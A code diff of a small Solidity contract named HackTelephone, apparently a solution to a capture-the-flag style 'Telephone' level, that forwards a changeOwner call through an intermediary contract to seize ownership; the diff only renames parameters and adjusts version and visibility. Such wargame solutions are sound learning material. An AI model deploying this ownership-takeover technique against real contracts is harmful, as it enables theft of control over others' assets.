@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.10;
+pragma solidity 0.8.7;
 
 import "./Telephone.sol";
 
@@ -11,12 +11,12 @@ import "./Telephone.sol";
 contract HackTelephone {
     Telephone telephone;
 
-    constructor(address _address) {
-        telephone = Telephone(_address);
+    constructor(address telephoneAddress) {
+        telephone = Telephone(telephoneAddress);
     }
 
     /// @dev Change the owner of the telephone.
-    function changeOwner(address _owner) public {
-        telephone.changeOwner(_owner);
+    function changeOwner(address owner) external {
+        telephone.changeOwner(owner);
     }
 }
